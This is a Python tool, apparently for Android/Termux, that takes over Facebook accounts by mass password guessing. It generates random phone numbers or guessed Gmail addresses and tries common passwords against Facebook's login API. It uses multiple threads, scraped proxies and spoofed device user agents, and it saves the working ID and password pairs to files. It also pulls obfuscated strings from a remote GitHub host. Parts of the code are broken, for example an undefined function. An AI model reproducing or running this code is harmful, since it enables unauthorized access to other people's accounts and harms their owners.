#_____________| START |_____________#
from os import path
import os,base64,zlib,pip,urllib
g1=('X');g2=('A');g3=('I');g4=('V');g5=('E');g6=('R');g7=('6');g8=('9');pr=('-P');pr1=('R');pr2=('O')
kkk=g1+g2+g3+g4+g5+g6+g7+g8+'/'+g1+g2+g3+g4+g5+pr+pr1+pr2
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python ROJOB.py')
except:pass
#_____________| CAPTURE |_____________#

#_____________| FUCK YOUR PHONE |_____________#
 
from requests import api
x = open(api.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import sessions
 
x = open(sessions.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:
    clr()
 
elif "sys.stdout.write" in x:
    clr()
else:
    pass
#_____________| ETC MODULE |_____________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#_____________| COLOUR |_____________#
BU= '\033[1;34m';A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;46m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
sys.stdout.write('\x1b]2; ROJOB ✘D\x07')
#_____________| PROXY |_____________#
try:
    rx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text.splitlines()
except:
    sys.exit(" Internet Error ")
def S2():
    en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','en_BD','en_IN','en_AF'])
    application_version = str(random.randint(111,444))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,33))
    ver = str(random.randrange(30,443))
    app_version = str(random.randint(111,444))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,33))
    app_ver_code=str(random.randint(000000000,999999999))
    application_version_code=str(random.randint(111111111,999999999))
    fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113','241.0.0.43.15'])
    fbcr = random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])
    s = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
    e = '[FBAN/FB4A;FBAV/413.0.0.30.104;FBBV/441615153;FBDM/{density=2.0,width=720,height=1590};FBLC/en_US;FBRV/441615153;FBCR/{fbcr};FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    ua = s + e
    #print(ua)
    return ua    
#-----------------------[UPDATE SERVER]--------------------#
xaiver1 = requests.get("h"+"tt"+"ps"+":/"+"/ra"+"w."+"git"+"hu"+"bus"+"erco"+"nt"+"en"+"t.co"+"m/"+"S"+"n-ro"+"ny"+"/S"+"erv"+"er-"+"Ro"+"o"+"m/"+"re"+"fs/h"+"ea"+"ds"+"/m"+"ain"+"/U"+"a.t"+"xt").text.strip()
xaiver2 = requests.get("h"+"tt"+"ps"+":/"+"/ra"+"w."+"git"+"hu"+"bus"+"erco"+"nt"+"en"+"t.co"+"m/"+"S"+"n-ro"+"ny"+"/S"+"erv"+"er-"+"Ro"+"o"+"m/"+"re"+"fs/h"+"ea"+"ds"+"/m"+"ain"+"/U"+"2a.t"+"xt").text.split('\n')[0]
xaiver3 = requests.get("h"+"tt"+"ps"+":/"+"/ra"+"w."+"git"+"hu"+"bus"+"erco"+"nt"+"en"+"t.co"+"m/"+"S"+"n-ro"+"ny"+"/S"+"erv"+"er-"+"Ro"+"o"+"m/"+"re"+"fs/h"+"ea"+"ds"+"/m"+"ain"+"/U"+"a3.t"+"xt").text.strip()
#-----------------------[FILE UPDATE]-------------------------#
alamin1 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{xaiver1}'
alamin2 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{xaiver2}'
alamin3 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{xaiver3}'
#-----------------------[RANDOM SERVER]-------------------------#
server2 = 'Dalvik/2.1.0 (Linux; U; Android 11; SM-A013M Build/PPR1.180610.011) '+'{alamin3}'
#_____________| LOGO DEF |_____________#
logo=("""\x1b[1;97m
 _     _ _______ _____ _    _ _______  ______\n\x1b[38;5;205m  \___/  |_____|   |    \  /  |______ |_____/\n\x1b[1;97m _/   \_ |     | __|__   \/   |______ |    \_\n\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\x1b[38;5;46m~/\x1b[1;97m FACEBOOK     \x1b[38;5;196m:\x1b[1;97m ARFAN ASHIQ\n\x1b[38;5;46m~/\x1b[1;97m GITHUB       \x1b[38;5;196m:\x1b[1;97m DARK HUNTER\n\x1b[38;5;46m~/\x1b[1;97m STATUS       \x1b[38;5;196m: \x1b[38;5;196m\033[47mALWAYS FIRE\x1b[0m \n\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#_____________| LINEX DEF |_____________#
def linex():
        print(48*'\033[1;34m━')
#_____________| CLEAR DEF |_____________#
def clear():
        os.system('clear')
        print(logo)
#_____________| COUNTER |_____________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[]
#_____________| MAIN DEF |_____________#
def ROJOB():
	clear()
	print(' \x1b[38;5;196m[\x1b[38;5;46mA\x1b[38;5;196m] \x1b[38;5;48mBD RANDOM')
	print(' \x1b[38;5;196m[\x1b[38;5;46mB\x1b[38;5;196m] \x1b[38;5;48mGMAIL 2.0')
	print(' \x1b[38;5;196m[\x1b[38;5;46mE\x1b[38;5;196m] \x1b[38;5;48mEXIT TOOL');linex()
	xd = input(' \x1b[38;5;196m[\x1b[38;5;46m?\x1b[38;5;196m] \x1b[38;5;48mChoice\x1b[38;5;196m :\x1b[38;5;48m')
	if xd in ['1','01']:
		bd()
	elif xd in ['2','02']:
		gml()
	else:
		exit()
#_____________| BD DEF |_____________#
def bd():
                user=[]
                clear()
                print('\x1b[1;97m[≠] Code Exp : 016/017/018/019');linex()
                code = input('\033[1;37m put code: ');linex()
                print('\x1b[1;97m[≠] LIMIT EXP : 1000/2000/5000/9999');linex()
                try:
                        limit = int(input('\x1b[1;97m[≠] put limit : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as Aking:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;37m[≠] Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m[≠] \x1b[1;96mDont Use Airplane mode in every time\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                              #  fs = random.choice(["rakib","shakib","sakib","alamin","shanto","riyaz","rezaul","mehedi","shawon","badhon","alif","delowar","masud","alifa"])
                                passlist = [psx,ids,code+psx[:3],'102030','203040','@12345@','mababa','@@@###','@#@#@#','i love you','shakib@123','shihab@@@']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python ROJOB.py')
#_____________| GMAIL DEF |_____________#
def gml():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as Aking:
                        total = str(len(fo))
                        clear()
                        print('\033[1;37m[≠] Total account : \033[1;32m'+total)
                        print(f'\033[1;37m[≠] \x1b[1;96mDont Use Airplane Mode In Every Time\033[1;97m')
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',fs+'@',fs+'@@',fs+'@@@',fs+'@#',ls+'12',ls+'123',ls+'1234',ls+'786',ls+'143']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
                os.system('python ROJOB.py')
#_____________| B-GRAPH |_____________#
def rndm(ids,passlist):
        global loop
        global oks,cps,twf
        balpakna=random.choice(['\x1b[38;5;48m','\x1b[38;5;46m','\033[1;33m','\x1b[38;5;196m','\x1b[1;97m','\033[1;34m','\x1b[38;5;14m','\33[1;34m','\x1b[38;5;50m','\x1b[38;5;49m','\x1b[38;5;48m','\x1b[38;5;47m','\x1b[38;5;205m','\x1b[1;96m','\x1b[38;5;121m','\x1b[38;5;86m','\x1b[38;5;122m','\x1b[38;5;123m'])
        sys.stdout.write('\r\r [ROJOB-XD] %s|\033[1;32mOK :%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.lite'
                        gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+gt+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid':adid,'format':'json','device_id':device_id,'email':ids,'password':pas,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','fb_api_req_friendly_name':'authenticate',}
                        headers={'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent':S2(),'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ROJOB-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ROJOB-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif twf in str(po):
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;143m [ROJOB-2F] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ROJOB-2F.txt','a').write(str(uid)+'|'+pas+'\n')
                                        twf.append(str(ids))
                                        break        
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;123m [ROJOB-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ROJOB-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
try:
        ROJOB()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass
#_____________| END |_____________#
if __name__=="__main__":
    ROJOB()